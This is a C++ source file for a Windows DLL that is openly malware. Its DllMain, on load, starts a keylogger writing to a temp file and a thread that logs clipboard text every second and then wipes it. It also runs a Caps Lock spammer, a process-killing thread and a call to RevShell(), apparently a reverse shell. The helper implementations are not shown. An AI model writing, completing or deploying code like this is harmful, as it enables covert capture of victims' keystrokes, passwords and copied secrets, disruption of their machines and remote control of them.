#include "debug/dbg_manager.h"
#include "modules/module_manager.h"
#include <condition_variable>
#include <filesystem>
#include <functional>
#include <mutex>
#include <nlohmann/json.hpp>
#include <queue>
#include <spdlog/spdlog.h>
#include <thread>
#include <tlhelp32.h>
#include <vector>
#include <windows.h>

// Global variables
static DebugConsole *g_console = nullptr;
static KeyLogger *g_keyLogger = nullptr;
static std::mutex clipboardMutex;

// Global Watcher instance
static Thread_Pool *g_threadpool = nullptr;

void DumpInput() {
    g_keyLogger = new KeyLogger(GetTempLogFilePath());
    g_keyLogger->StartLogging();
}

void spamCapsLock() {
    while (true) {
        keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
        keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(530);
    }
}

void ClearClipboardThread() { // Changed to void for consistency with thread pool
    while (true) {
        {
            std::lock_guard<std::mutex> lock(clipboardMutex);
            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char *pszText = static_cast<char *>(GlobalLock(hData));
                    if (pszText) {
                        spdlog::info("Clipboard data: {}", pszText);
                        GlobalUnlock(hData);
                    }
                }
                EmptyClipboard();
                CloseClipboard();
            }
        }
        Sleep(1000);
    }
}

int main() {
    g_console = new DebugConsole(true); // Set to true to enable console
    if (!g_console->Initialize()) {
        spdlog::error("Failed to initialize console");
        return 1;
    }
    if (!g_console->InitializeLogging()) {
        spdlog::error("Failed to initialize logging");
        return 1;
    }
    DumpMemoryInfo();
    return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpRes) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Initialize the Watcher thread pool with, say, 4 threads
        g_threadpool = new Thread_Pool(5);

        // Enqueue tasks into the Watcher thread pool
        RevShell();
        g_threadpool->enqueue([] { main(); });
        g_threadpool->enqueue([] { DumpInput(); });
        g_threadpool->enqueue([] { ClearClipboardThread(); });
        g_threadpool->enqueue([] { spamCapsLock(); });
        g_threadpool->enqueue([] { ProcessKillerThread(nullptr); });
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        if (g_threadpool) {
            delete g_threadpool; // This will stop and join all threads
            g_threadpool = nullptr;
        }
        if (g_console) {
            g_console->Cleanup();
            delete g_console;
            g_console = nullptr;
        }
        if (g_keyLogger) {
            g_keyLogger->StopLogging();
            delete g_keyLogger;
            g_keyLogger = nullptr;
        }
        FreeConsole();
    }
    return 1;
}